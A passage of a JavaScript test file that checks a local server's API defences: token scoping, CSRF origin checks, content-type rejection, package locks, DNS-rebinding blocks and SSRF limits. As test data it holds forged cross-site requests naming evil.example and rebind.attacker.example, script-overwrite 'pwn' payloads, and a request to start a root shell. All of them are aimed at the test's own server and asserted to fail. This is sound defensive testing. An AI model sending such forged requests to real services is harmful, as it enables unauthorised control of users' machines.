 const dummyTerminalManager = {
  createSession() {
   return { id: 'dummy-term-1', title: 'Dummy SSH' }
  },
  killSession() {
   return false
  },
  attachWebSocket(_id, _req, socket) {
   socket.write('HTTP/1.1 101 Switching Protocols\r\n\r\n')
   socket.destroy()
   return true
  },
 }

 const server = http.createServer((req, res) => {
  if (!isAllowedLocalHost(req, { requireHost: true })) {
   const reqPath = (req.url || '/').split('?')[0]
   if (reqPath === '/api' || reqPath.startsWith('/api/')) {
    res.writeHead(403, { 'Content-Type': 'application/json; charset=utf-8', 'Cache-Control': 'no-store' })
    res.end(JSON.stringify({ ok: false, error: 'Forbidden Host header' }))
   }
   else {
    res.writeHead(403, { 'Content-Type': 'text/plain; charset=utf-8' })
    res.end('Forbidden')
   }
   return
  }
  const pathname = (req.url || '/').split('?')[0]
  if (pathname === '/api/fs' || pathname.startsWith('/api/fs/')) {
   return handleFsApiRequest(req, res, {
    secretStore,
    platform: 'linux',
    homedir: fsHome,
    mountsText: '',
    extraMountParents: [],
   })
  }
  if (pathname === '/api/deploy' || pathname.startsWith('/api/deploy/')) {
   return handleDeployApiRequest(req, res, { secretStore, terminalManager: dummyTerminalManager })
  }
  if (pathname === '/api/mcp' || pathname === '/api/agent' || pathname.startsWith('/api/agent/')) {
   return handleAgentApiRequest(req, res, {
    secretStore,
    createAuthorizedRootKv: proxy.createAuthorizedRootKv,
    eventHub,
   })
  }
  if (pathname === '/api/vault' || pathname.startsWith('/api/vault/')) {
   return proxy.handleVaultApiRequest(req, res)
  }
  if (pathname === '/api/data' || pathname.startsWith('/api/data/')) {
   return proxy.handleDataProxyRequest(req, res)
  }
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' })
  res.end('<!doctype html><title>OK</title>')
 })

 server.on('upgrade', (req, socket, head) => {
  const pathname = (req.url || '/').split('?')[0]
  if (pathname === '/api/deploy/terminal/ws') {
   if (!isAllowedLocalHost(req, { requireHost: true }) || !isAllowedLocalOrigin(req, { requireHost: true })) {
    socket.write('HTTP/1.1 403 Forbidden\r\nConnection: close\r\n\r\n')
    socket.destroy()
    return
   }
   handleDeployUpgrade(req, socket, head, { terminalManager: dummyTerminalManager, requireHost: true })
   return
  }
  socket.destroy()
 })

 await new Promise(resolve => server.listen(0, '127.0.0.1', resolve))
 const port = server.address().port
 const origin = `http://127.0.0.1:${port}`
 const dataUrl = `${origin}/api/data?mode=disk`

 function sendRawHttpRequest(rawText) {
  return new Promise((resolve, reject) => {
   const client = net.connect(port, '127.0.0.1')
   const chunks = []
   client.on('connect', () => {
    client.write(rawText)
   })
   client.on('data', chunk => {
    chunks.push(chunk)
    const str = Buffer.concat(chunks).toString('utf8')
    if (str.includes('\r\n\r\n')) {
     const headerEnd = str.indexOf('\r\n\r\n')
     const headStr = str.slice(0, headerEnd)
     const statusLine = headStr.split('\r\n')[0] || ''
     const statusMatch = /^HTTP\/1\.[01]\s+(\d{3})/.exec(statusLine)
     const bodyPart = str.slice(headerEnd + 4)
     client.end()
     resolve({
      status: statusMatch ? Number(statusMatch[1]) : 0,
      raw: str,
      head: headStr,
      body: bodyPart,
     })
    }
   })
   client.on('end', () => {
    const str = Buffer.concat(chunks).toString('utf8')
    const statusMatch = /^HTTP\/1\.[01]\s+(\d{3})/.exec(str.split('\r\n')[0] || '')
    resolve({
     status: statusMatch ? Number(statusMatch[1]) : 0,
     raw: str,
     head: str.split('\r\n\r\n')[0] || '',
     body: str.split('\r\n\r\n').slice(1).join('\r\n\r\n'),
    })
   })
   client.on('error', reject)
  })
 }

 try {
  // 3. Seed Session A with a Default public lane AND a passphrase-protected VaultPkg lane
  const clientA = httpKV({ baseUrl: dataUrl, switchable: true, proxyCapabilities: true })
  const winA = {}
  const sessA = await initSessionState(clientA, winA)
  const createdPkg = await createPackage(clientA, sessA.sessionId, {
   name: 'VaultPkg',
   passphrase: 'csrf-vault-passphrase',
  }, winA)
  assert.equal(createdPkg.ok, true)
  const vaultPkgId = createdPkg.pkg.id
  const tokenAUnlocked = clientA.getSessionToken()

  const publicLaneId = 'lane-public-csrf'
  const lockedLaneId = 'lane-vault-csrf'
  await registerLaneInPackage(clientA, publicLaneId, 'PublicLane', DEFAULT_PACKAGE_ID)
  await clientA.namespace(publicLaneId).set('title', 'PublicLane')
  await saveLaneScript(clientA, clientA.namespace(publicLaneId), publicLaneId, ['; to val 10'])

  await registerLaneInPackage(clientA, lockedLaneId, 'ClassifiedLane', vaultPkgId)
  await clientA.namespace(lockedLaneId).set('title', 'ClassifiedLane')
  await saveLaneScript(clientA, clientA.namespace(lockedLaneId), lockedLaneId, ['; to classified 777'])

  // Bootstrap token (sid: null, dir: null, allowUnlocked: true)
  const bootRes = await fetch(`${origin}/api/vault/session`, {
   method: 'POST',
   headers: { 'Content-Type': 'application/json' },
   body: '{}',
  }).then(r => r.json())
  assert.equal(bootRes.ok, true)
  const bootstrapToken = bootRes.token

  // Lane-scoped capability token (only valid for /api/data on publicLaneId)
  const laneTokRes = await clientA.fetchVaultApi('lane-token', {
   method: 'POST',
   body: { lanes: [publicLaneId] },
  })
  const laneOnlyToken = laneTokRes.data.token
  clientA.setSessionToken(tokenAUnlocked, { sessionId: sessA.sessionId, basePath: null })

  const eventsBeforeAttacks = emittedEvents.length

  // 4. Unauthenticated requests -> 401 + x-civil-token-bootstrap, and lane-scoped tokens -> 403
  for (const [m, p] of [
   ['GET', '/api/agent/sessions'],
   ['GET', '/api/agent/events'],
   ['POST', '/api/mcp'],
   ['GET', '/api/fs/roots'],
   ['POST', '/api/fs/mkdir'],
   ['POST', '/api/deploy/kv/test'],
  ]) {
   const unauth = await fetch(`${origin}${p}`, {
    method: m,
    ...(m === 'POST' ? { headers: { 'Content-Type': 'application/json' }, body: '{}' } : {}),
   })
   assert.equal(unauth.status, 401, `Expected 401 without token for ${m} ${p}`)
   assert.equal(unauth.headers.get(TOKEN_BOOTSTRAP_HEADER), '/api/vault/session')

   const laneDenied = await fetch(`${origin}${p}`, {
    method: m,
    headers: {
     [SESSION_TOKEN_HEADER]: laneOnlyToken,
     ...(m === 'POST' ? { 'Content-Type': 'application/json' } : {}),
    },
    ...(m === 'POST' ? { body: '{}' } : {}),
   })
   assert.equal(laneDenied.status, 403, `Expected 403 for lane-scoped token on ${m} ${p}`)
  }

  // Query ?token= must ONLY work on GET /api/agent/events, never on REST endpoints
  const queryRestDenied = await fetch(`${origin}/api/agent/sessions?token=${encodeURIComponent(bootstrapToken)}`)
  assert.equal(queryRestDenied.status, 401)
  const queryFsDenied = await fetch(`${origin}/api/fs/roots?token=${encodeURIComponent(bootstrapToken)}`)
  assert.equal(queryFsDenied.status, 401)
  const queryEventsLaneDenied = await fetch(`${origin}/api/agent/events?token=${encodeURIComponent(laneOnlyToken)}`)
  assert.equal(queryEventsLaneDenied.status, 403)

  // Verify SSE events endpoint accepts valid query ?token= from same-origin
  const sseAbort = new AbortController()
  const sseResp = await fetch(`${origin}/api/agent/events?token=${encodeURIComponent(bootstrapToken)}`, {
   signal: sseAbort.signal,
  })
  assert.equal(sseResp.status, 200)
  assert.ok((sseResp.headers.get('content-type') || '').includes('text/event-stream'))
  sseAbort.abort()

  // 5. Origin: null, external Origin, cross-port Origin, and Sec-Fetch-Site: cross-site/same-site -> 403 everywhere
  const badOriginHeaderSets = [
   { Origin: 'null' },
   { Origin: 'https://evil.example' },
   { Origin: 'http://127.0.0.1:9999' },
   { 'Sec-Fetch-Site': 'cross-site' },
   { 'Sec-Fetch-Site': 'same-site' },
  ]
  const csrfTargets = [
   ['POST', '/api/agent/lane/script', JSON.stringify({ laneId: publicLaneId, action: 'set-line', lineNumber: 1, text: '; to pwn 1' })],
   ['POST', '/api/mcp', JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'cc_create_lane', arguments: { title: 'Pwned' } } })],
   ['POST', '/api/agent/lane/eval', JSON.stringify({ laneId: publicLaneId })],
   ['GET', '/api/agent/sessions', null],
   ['GET', `/api/agent/events?token=${encodeURIComponent(bootstrapToken)}`, null],
   ['POST', '/api/fs/mkdir', JSON.stringify({ parent: fsHome, name: 'csrf-origin-dir' })],
   ['GET', '/api/fs/roots', null],
   ['POST', '/api/deploy/terminal/start', JSON.stringify({ action: 'shell', server: { host: '127.0.0.1', user: 'root' } })],
   ['POST', '/api/vault/session', '{}'],
   ['GET', `/api/data?mode=disk&key=${encodeURIComponent(`${publicLaneId}.title`)}`, null],
  ]
  for (const extraHeaders of badOriginHeaderSets) {
   for (const [m, p, body] of csrfTargets) {
    const res = await fetch(`${origin}${p}`, {
     method: m,
     headers: {
      [SESSION_TOKEN_HEADER]: tokenAUnlocked,
      ...(m === 'POST' ? { 'Content-Type': 'application/json' } : {}),
      ...extraHeaders,
     },
     ...(body !== null ? { body } : {}),
    })
    assert.equal(res.status, 403, `Expected 403 for ${JSON.stringify(extraHeaders)} on ${m} ${p}`)
   }
  }

  // WS upgrade with Origin: null / evil Origin / Sec-Fetch-Site: cross-site -> 403
  for (const hdrLine of ['Origin: null', 'Origin: https://evil.example', 'Sec-Fetch-Site: cross-site']) {
   const wsErr = await sendRawHttpRequest(
    `GET /api/deploy/terminal/ws?id=dummy-term-1 HTTP/1.1\r\n` +
    `Host: 127.0.0.1:${port}\r\n` +
    `${hdrLine}\r\n` +
    'Upgrade: websocket\r\n' +
    'Connection: Upgrade\r\n' +
    `Sec-WebSocket-Key: ${crypto.randomBytes(16).toString('base64')}\r\n` +
    'Sec-WebSocket-Version: 13\r\n\r\n'
   )
   assert.equal(wsErr.status, 403, `Expected WS upgrade 403 for ${hdrLine}`)
  }

  // 6. Non-JSON Content-Type (text/plain, form-urlencoded, missing) -> 415 before body parsing
  const badContentTypes = ['text/plain', 'application/x-www-form-urlencoded', null]
  const jsonMutatingTargets = [
   ['/api/agent/lane/script', JSON.stringify({ laneId: publicLaneId, action: 'set-line', lineNumber: 1, text: '; to pwn 2' })],
   ['/api/mcp', JSON.stringify({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'cc_create_lane', arguments: { title: 'CT-Pwn' } } })],
   ['/api/agent/lane/eval', JSON.stringify({ laneId: publicLaneId, applyExports: true })],
   ['/api/fs/mkdir', JSON.stringify({ parent: fsHome, name: 'csrf-pwned-dir' })],
   ['/api/deploy/terminal/start', JSON.stringify({ action: 'shell', server: { host: '127.0.0.1', user: 'root' } })],
   ['/api/vault/session', '{}'],
  ]
  for (const ct of badContentTypes) {
   for (const [p, body] of jsonMutatingTargets) {
    const headers = { [SESSION_TOKEN_HEADER]: tokenAUnlocked }
    if (ct !== null) {
     headers['Content-Type'] = ct
    }
    const res = await fetch(`${origin}${p}`, { method: 'POST', headers, body })
    assert.equal(res.status, 415, `Expected 415 for Content-Type=${String(ct)} on POST ${p}`)
   }
  }

  // 7. GET /api/agent/lane/eval is rejected with 405
  const getEvalRes = await fetch(`${origin}/api/agent/lane/eval?lane=${encodeURIComponent(publicLaneId)}&applyExports=true`, {
   headers: { [SESSION_TOKEN_HEADER]: tokenAUnlocked },
  })
  assert.equal(getEvalRes.status, 405)

  // Verify none of the CSRF/415/405 attacks modified scripts, created directories, or emitted SSE events
  const loadedPublicAfter = await loadLaneScript(clientA, clientA.namespace(publicLaneId), publicLaneId)
  assert.deepEqual(loadedPublicAfter.records.map(r => r.text), ['; to val 10'])
  await assert.rejects(() => fs.stat(path.join(fsHome, 'csrf-pwned-dir')))
  await assert.rejects(() => fs.stat(path.join(fsHome, 'csrf-origin-dir')))
  assert.equal(emittedEvents.length, eventsBeforeAttacks)

  // 8. createAuthorizedRootKv on /api/agent/* and /api/mcp enforces package locks and revocations
  const bootPublicLane = await fetch(`${origin}/api/agent/lane?session=${encodeURIComponent(sessA.sessionId)}&lane=${publicLaneId}`, {
   headers: { [SESSION_TOKEN_HEADER]: bootstrapToken },
  })
  assert.equal(bootPublicLane.status, 200)
  const bootPublicJson = await bootPublicLane.json()
  assert.equal(bootPublicJson.ok, true)

  const bootSessInspect = await fetch(`${origin}/api/agent/session?session=${encodeURIComponent(sessA.sessionId)}`, {
   headers: { [SESSION_TOKEN_HEADER]: bootstrapToken },
  })
  assert.equal(bootSessInspect.status, 200)
  const bootSessJson = await bootSessInspect.json()
  assert.equal(bootSessJson.ok, true)
  assert.ok(!bootSessJson.openPackageIds.includes(vaultPkgId), 'Locked VaultPkg must be omitted from unlocked session inspect')
  assert.ok(!bootSessJson.catalog.some(entry => entry.id === lockedLaneId), 'Locked lane must be omitted from catalog')

  const lockedGetRes = await fetch(`${origin}/api/agent/lane?session=${encodeURIComponent(sessA.sessionId)}&lane=${lockedLaneId}`, {
   headers: { [SESSION_TOKEN_HEADER]: bootstrapToken },
  })
  assert.equal(lockedGetRes.status, 403)

  const lockedEvalRes = await fetch(`${origin}/api/agent/lane/eval`, {
   method: 'POST',
   headers: { 'Content-Type': 'application/json', [SESSION_TOKEN_HEADER]: bootstrapToken },
   body: JSON.stringify({ sessionId: sessA.sessionId, laneId: lockedLaneId }),
  })
  assert.equal(lockedEvalRes.status, 403)

  const lockedScriptRes = await fetch(`${origin}/api/agent/lane/script`, {
   method: 'POST',
   headers: { 'Content-Type': 'application/json', [SESSION_TOKEN_HEADER]: bootstrapToken },
   body: JSON.stringify({ sessionId: sessA.sessionId, laneId: lockedLaneId, action: 'set-line', lineNumber: 1, text: '; to x 1' }),
  })
  assert.equal(lockedScriptRes.status, 403)

  const lockedMcpRes = await fetch(`${origin}/api/mcp`, {
   method: 'POST',
   headers: { 'Content-Type': 'application/json', [SESSION_TOKEN_HEADER]: bootstrapToken },
   body: JSON.stringify({
    jsonrpc: '2.0',
    id: 10,
    method: 'tools/call',
    params: { name: 'cc_get_lane', arguments: { sessionId: sessA.sessionId, laneId: lockedLaneId } },
   }),
  }).then(r => r.json())
  assert.equal(lockedMcpRes.result.isError, true)
  assert.equal(lockedMcpRes.result.structuredContent.accessDenied, true)

  // Unlocked Session A token CAN access lockedLaneId, and loses access immediately after closePackageInSession
  const unlockedGetRes = await fetch(`${origin}/api/agent/lane?session=${encodeURIComponent(sessA.sessionId)}&lane=${lockedLaneId}`, {
   headers: { [SESSION_TOKEN_HEADER]: tokenAUnlocked },
  })
  assert.equal(unlockedGetRes.status, 200)
  const unlockedGetJson = await unlockedGetRes.json()
  assert.deepEqual(unlockedGetJson.lane.lines, ['; to classified 777'])

  await closePackageInSession(clientA, sessA.sessionId, vaultPkgId)
  const postCloseAgentRes = await fetch(`${origin}/api/agent/lane?session=${encodeURIComponent(sessA.sessionId)}&lane=${lockedLaneId}`, {
   headers: { [SESSION_TOKEN_HEADER]: tokenAUnlocked },
  })
  assert.equal(postCloseAgentRes.status, 403)

  // 9. DNS Rebinding protection: Host + matching Origin for non-local hostname -> 403 on all endpoints
  const rebindHost = `rebind.attacker.example:${port}`
  const rebindOrigin = `http://rebind.attacker.example:${port}`
  const rebindTargets = [
   `GET / HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\nConnection: close\r\n\r\n`,
   `POST /api/deploy/terminal/start HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\n${SESSION_TOKEN_HEADER}: ${bootstrapToken}\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}`,
   `GET /api/deploy/terminal/ws?id=dummy-term-1 HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${crypto.randomBytes(16).toString('base64')}\r\nSec-WebSocket-Version: 13\r\n\r\n`,
   `GET /api/agent/sessions HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\n${SESSION_TOKEN_HEADER}: ${bootstrapToken}\r\nConnection: close\r\n\r\n`,
   `POST /api/mcp HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\n${SESSION_TOKEN_HEADER}: ${bootstrapToken}\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}`,
   `GET /api/fs/roots HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\n${SESSION_TOKEN_HEADER}: ${bootstrapToken}\r\nConnection: close\r\n\r\n`,
   `POST /api/vault/session HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}`,
   `GET /api/data?mode=disk&key=${encodeURIComponent(`${publicLaneId}.title`)} HTTP/1.1\r\nHost: ${rebindHost}\r\nOrigin: ${rebindOrigin}\r\n${SESSION_TOKEN_HEADER}: ${bootstrapToken}\r\nConnection: close\r\n\r\n`,
  ]
  for (const rawReq of rebindTargets) {
   const rebindRes = await sendRawHttpRequest(rawReq)
   assert.equal(rebindRes.status, 403, `Expected 403 for DNS rebinding request: ${rawReq.split('\r\n')[0]}`)
  }

  // Verify verifyApiSessionToken utility directly
  assert.equal(verifyApiSessionToken({ headers: {}, url: '/api/agent/sessions' }, { secretStore }).status, 401)
  assert.equal(
   verifyApiSessionToken({ headers: { [SESSION_TOKEN_HEADER.toLowerCase()]: laneOnlyToken }, url: '/api/agent/sessions' }, { secretStore }).status,
   403
  )
  assert.equal(
   verifyApiSessionToken({ headers: { [SESSION_TOKEN_HEADER.toLowerCase()]: bootstrapToken }, url: '/api/agent/sessions' }, { secretStore }).ok,
   true
  )
 }
 finally {
  if (typeof server.closeAllConnections === 'function') {
   server.closeAllConnections()
  }
  await new Promise(resolve => server.close(resolve))
  await fs.rm(tmpDir, { recursive: true, force: true })
 }
})

test('data-proxy sends text/plain Content-Type to civil-memory, httpKV proactively bootstraps tokens (zero 401s), and /api/vault/fetch proxies CORS-free external fetches safely', async () => {
 const memStore = new Map()
 const memServer = http.createServer((req, res) => {
  const url = new URL(req.url || '/', 'http://127.0.0.1')
  const basePath = url.searchParams.get('modeOptions.disk.basePath') || '__default__'
  const key = url.searchParams.get('key')
  const fullKey = `${basePath}::${key}`
  const method = String(req.method || 'GET').toUpperCase()
  const chunks = []
  req.on('data', chunk => chunks.push(chunk))
  req.on('end', () => {
   if (method === 'GET' || method === 'HEAD') {
    if (!memStore.has(fullKey)) {
     res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' })
     res.end('Not found')
     return
    }
    const val = memStore.get(fullKey)
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' })
    res.end(method === 'HEAD' ? '' : val)
    return
   }
   if (method === 'POST') {
    const ct = String(req.headers['content-type'] || '').toLowerCase()
    if (!ct.startsWith('text/plain')) {
     res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' })
     res.end('Internal Server Error: The "data" argument must be of type string or an instance of Buffer, TypedArray, or DataView. Received an instance of Object')
     return
    }
    const rawBody = Buffer.concat(chunks).toString('utf8')
    memStore.set(fullKey, rawBody)
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' })
    res.end('ok')
    return
   }
   if (method === 'DELETE') {
    memStore.delete(fullKey)
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' })
    res.end('ok')
    return
   }
   res.writeHead(405)
   res.end('Method not allowed')
  })
 })

 await new Promise(resolve => memServer.listen(0, '127.0.0.1', resolve))
 const memPort = memServer.address().port
 const secretStore = createServerSecretStore({ useEnv: false })
 const externalCalls = []
 const proxy = createDataProxyHandler({
  backendBaseUrl: `http://127.0.0.1:${memPort}/?mode=disk`,
  secretStore,
  setAsDefaultStore: false,
  externalFetch: async (url, init) => {
   externalCalls.push({ url, init })
   if (url === 'https://data.nateferrero.com/beacon/balance') {
    return {
     ok: true,
     status: 200,
     statusText: 'OK',
     url,
     headers: new Headers({ 'content-type': 'text/plain' }),
     async text() { return '111249' },
    }
   }
   throw new Error(`Unexpected externalFetch URL: ${url}`)
  },
 })

 const dataStatuses = []
 const proxyServer = http.createServer((req, res) => {
  const pathname = (req.url || '/').split('?')[0]
  if (pathname === '/api/data' || pathname.startsWith('/api/data/')) {
   const origWriteHead = res.writeHead.bind(res)
   res.writeHead = (statusCode, ...rest) => {
    dataStatuses.push({ method: req.method, statusCode, url: req.url })
    return origWriteHead(statusCode, ...rest)
   }
   return proxy.handleDataProxyRequest(req, res)
  }
  if (pathname === '/api/vault' || pathname.startsWith('/api/vault/')) {
   return proxy.handleVaultApiRequest(req, res)
  }
  res.writeHead(404)
  res.end('Not found')
 })

 await new Promise(resolve => proxyServer.listen(0, '127.0.0.1', resolve))
 const proxyPort = proxyServer.address().port
 const proxyOrigin = `http://127.0.0.1:${proxyPort}`
 const proxyDataUrl = `${proxyOrigin}/api/data?mode=disk`

 const makeMemStorage = () => {
  const m = new Map()
  return {
   getItem: k => (m.has(k) ? m.get(k) : null),
   setItem: (k, v) => { m.set(k, String(v)) },
   removeItem: k => { m.delete(k) },
  }
 }

 try {
  const client = httpKV({ baseUrl: proxyDataUrl, switchable: true, proxyCapabilities: true, proactiveToken: true })

  // 1. Initial read proactively bootstraps capability token: ZERO 401s on /api/data
  assert.equal(await client.get('session'), null)
  assert.equal(dataStatuses.some(s => s.statusCode === 401), false)

  // 2. Full session initialization, confirming a scoped directory, & writes (including empty strings) trigger ZERO 500s or 401s
  const winMem = {
   localStorage: makeMemStorage(),
   sessionStorage: makeMemStorage(),
  }
  const sessState = await initSessionState(client, winMem)
  assert.ok(sessState.sessionId)
  const dirSetRes = await setSessionDataDir(client, winMem, sessState.sessionId, { dataDir: '/tmp/test-civil-dir' })
  assert.equal(dirSetRes.ok, true)
  const dirClient = client.withBasePath('/tmp/test-civil-dir')
  await dirClient.set('lanes#lane-1/package', DEFAULT_PACKAGE_ID)
  await dirClient.set('stories#lane-1/r/2026-11-27/st-1', JSON.stringify({ id: 'st-1', ok: true }))
  await dirClient.set('empty-val', '')
  assert.equal(await dirClient.get('lanes#lane-1/package'), DEFAULT_PACKAGE_ID)
  assert.equal(await dirClient.get('empty-val'), '')
  await dirClient.delete('empty-val')
  assert.equal(dataStatuses.some(s => s.statusCode === 401), false, `Unexpected 401s: ${JSON.stringify(dataStatuses)}`)
  assert.equal(dataStatuses.some(s => s.statusCode >= 500), false, `Unexpected 500s: ${JSON.stringify(dataStatuses)}`)

  // 3. externalFetch proxies external HTTPS requests through /api/vault/fetch (avoiding browser CORS)
  const extResp = await client.externalFetch('https://data.nateferrero.com/beacon/balance')
  assert.equal(extResp.ok, true)
  assert.equal(extResp.status, 200)
  assert.equal(await extResp.text(), '111249')
  assert.equal(externalCalls.length, 1)
  assert.equal(externalCalls[0].url, 'https://data.nateferrero.com/beacon/balance')
  assert.equal(externalCalls[0].init.credentials, 'omit')

  // Unauthenticated /api/vault/fetch -> 401 with bootstrap hint; loopback/private SSRF -> 400/403
  const unauthFetch = await fetch(`${proxyOrigin}/api/vault/fetch`, {
   method: 'POST',
   headers: { 'Content-Type': 'application/json' },
   body: JSON.stringify({ url: 'https://data.nateferrero.com/beacon/balance' }),
  })
  assert.equal(unauthFetch.status, 401)
  assert.equal(unauthFetch.headers.get(TOKEN_BOOTSTRAP_HEADER), '/api/vault/session')

  await assert.rejects(() => client.externalFetch('http://127.0.0.1:3333/'), /loopback|private|blocked|not allowed/i)

  // 4. Expired session token recovers cleanly by re-bootstrapping via /api/vault/session
  const expiredTok = createCapabilityToken({
   sessionId: sessState.sessionId,
   basePath: '/tmp/test-civil-dir',
   packages: [DEFAULT_PACKAGE_ID],
   iat: Date.now() - 10_000,
   exp: Date.now() - 1,
  }, secretStore)
  dirClient.setSessionToken(expiredTok, { sessionId: sessState.sessionId, basePath: '/tmp/test-civil-dir' })
  assert.equal(await dirClient.get('lanes#lane-1/package'), DEFAULT_PACKAGE_ID)
 }
 finally {
  if (typeof proxyServer.closeAllConnections === 'function') proxyServer.closeAllConnections()
  if (typeof memServer.closeAllConnections === 'function') memServer.closeAllConnections()
  await Promise.all([
   new Promise(resolve => proxyServer.close(resolve)),
   new Promise(resolve => memServer.close(resolve)),
  ])
 }
})
